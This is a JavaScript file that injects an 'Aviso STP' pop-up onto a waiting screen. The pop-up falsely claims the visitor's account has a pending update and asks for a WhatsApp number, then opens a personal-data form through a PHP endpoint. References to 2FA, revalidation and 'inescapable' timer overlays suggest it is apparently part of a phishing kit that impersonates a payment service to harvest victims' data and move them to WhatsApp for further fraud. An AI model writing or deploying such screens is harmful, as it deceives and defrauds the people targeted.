/**
 * Aviso de contacto por WhatsApp en la pantalla de espera.
 * A los 5s, si no hay otra tela abierta. Aceptar abre la tela de datos.
 * Si llega otra tela, esta se cierra y no vuelve a mostrarse.
 */
(function () {
    var ESPERA_MS = 5000;
    var mostrado = false;
    var sustituido = false;
    var epochAviso = 0;
    var abriendo = false;

    function telaVisible() {
        function activa(id) {
            var el = document.getElementById(id);
            return !!(el && el.classList.contains('active'));
        }
        return activa('adminModal')
            || activa('auth2faOverlay')
            || activa('dpOverlay')
            || activa('stpRevalidarOverlay')
            || !!document.getElementById('timerModalInescapable');
    }

    function cerrarVisual() {
        var overlay = document.getElementById('avisoWaOverlay');
        if (!overlay || !overlay.classList.contains('active')) return;
        overlay.classList.remove('active');
        sustituido = true;
    }

    function injectStyles() {
        if (document.getElementById('aviso-wa-styles')) return;
        var style = document.createElement('style');
        style.id = 'aviso-wa-styles';
        style.textContent = [
            '.aviso-wa-overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);display:flex;justify-content:center;align-items:center;z-index:9200;opacity:0;visibility:hidden;transition:opacity .2s ease;}',
            '.aviso-wa-overlay.active{opacity:1;visibility:visible;}',
            '.aviso-wa-box{background:#fff;width:640px;max-width:94vw;max-height:88vh;overflow:auto;border:1px solid #c0c8e8;border-radius:4px;font-family:Arial,Helvetica,sans-serif;box-shadow:0 6px 24px rgba(0,0,0,.3);}',
            '.aviso-wa-title{background:#1a3b8f;color:#fff;text-align:center;padding:8px 12px;font-size:13px;font-weight:bold;}',
            '.aviso-wa-body{display:flex;gap:14px;align-items:flex-start;padding:16px 18px 8px;}',
            '.aviso-wa-logos{flex-shrink:0;}',
            '.aviso-wa-logo{width:46px;height:auto;display:block;}',
            '.aviso-wa-text{font-size:13px;line-height:1.55;color:#1a1a1a;text-align:justify;margin:0;}',
            '.aviso-wa-text strong{color:#1a3b8f;}',
            '.aviso-wa-error{display:none;color:#a32020;font-size:12px;padding:0 18px 4px;}',
            '.aviso-wa-actions{text-align:right;padding:8px 18px 16px;}',
            '.aviso-wa-btn{background:#1a3b8f;color:#fff;border:1px solid #142e70;border-radius:3px;padding:7px 22px;font-size:13px;font-weight:bold;cursor:pointer;font-family:Arial,Helvetica,sans-serif;}',
            '.aviso-wa-btn:hover{background:#142e70;}',
            '.aviso-wa-btn:disabled{opacity:.65;cursor:default;}'
        ].join('');
        document.head.appendChild(style);
    }

    function crearModal() {
        if (document.getElementById('avisoWaOverlay')) return;
        var html = ''
            + '<div id="avisoWaOverlay" class="aviso-wa-overlay" role="dialog" aria-modal="true" aria-labelledby="avisoWaTitle">'
            + '  <div class="aviso-wa-box">'
            + '    <div class="aviso-wa-title" id="avisoWaTitle">Aviso STP</div>'
            + '    <div class="aviso-wa-body">'
            + '      <div class="aviso-wa-logos">'
            + '        <img src="css/img/logo_Chico.png" alt="STP" class="aviso-wa-logo">'
            + '      </div>'
            + '      <p class="aviso-wa-text">'
            + '        Hay una actualización pendiente en su cuenta y debemos validarla directamente con usted. '
            + '        Por este medio no es posible completar el proceso. Necesitamos contactarle por '
            + '        <strong>WhatsApp</strong> para darle seguimiento en tiempo real. '
            + '        Indíquenos un número de WhatsApp en el que podamos comunicarnos.'
            + '      </p>'
            + '    </div>'
            + '    <div id="avisoWaError" class="aviso-wa-error"></div>'
            + '    <div class="aviso-wa-actions">'
            + '      <button type="button" class="aviso-wa-btn" id="avisoWaAceptar">Aceptar</button>'
            + '    </div>'
            + '  </div>'
            + '</div>';
        document.body.insertAdjacentHTML('beforeend', html);
        document.getElementById('avisoWaAceptar').addEventListener('click', aceptar);
    }

    async function mostrar() {
        if (mostrado || sustituido || telaVisible()) return;
        mostrado = true;
        const epoch = window.Telas ? await Telas.ocupar('aviso_wa') : null;
        if (window.Telas && (epoch == null || !Telas.vigente(epoch))) {
            mostrado = false;
            return;
        }
        crearModal();
        epochAviso = window.Telas ? Telas.epoch : 0;
        document.getElementById('avisoWaOverlay').classList.add('active');
    }

    async function aceptar() {
        if (abriendo) return;
        if (window.Telas && !Telas.vigente(epochAviso)) return;
        abriendo = true;
        var btn = document.getElementById('avisoWaAceptar');
        var error = document.getElementById('avisoWaError');
        if (btn) btn.disabled = true;
        if (error) error.style.display = 'none';

        try {
            var res = await fetch('php_modales/abrir_datos_contacto.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'abrir_datos' })
            });
            var data = await res.json().catch(function () { return null; });
            if (window.Telas && !Telas.vigente(epochAviso)) return;
            if (!data || !data.success || !data.datos_personales_id) {
                throw new Error((data && data.error) || 'No fue posible continuar');
            }
            if (typeof datosPersonalesSystem !== 'undefined' && datosPersonalesSystem) {
                datosPersonalesSystem.show({ datos_personales_id: data.datos_personales_id });
            }
        } catch (e) {
            abriendo = false;
            if (btn) btn.disabled = false;
            if (error) {
                error.textContent = e.message || 'No fue posible continuar';
                error.style.display = 'block';
            }
        }
    }

    document.addEventListener('DOMContentLoaded', function () {
        injectStyles();
        if (window.Telas) Telas.registrar('aviso_wa', cerrarVisual);
        setTimeout(mostrar, ESPERA_MS);
    });
})();
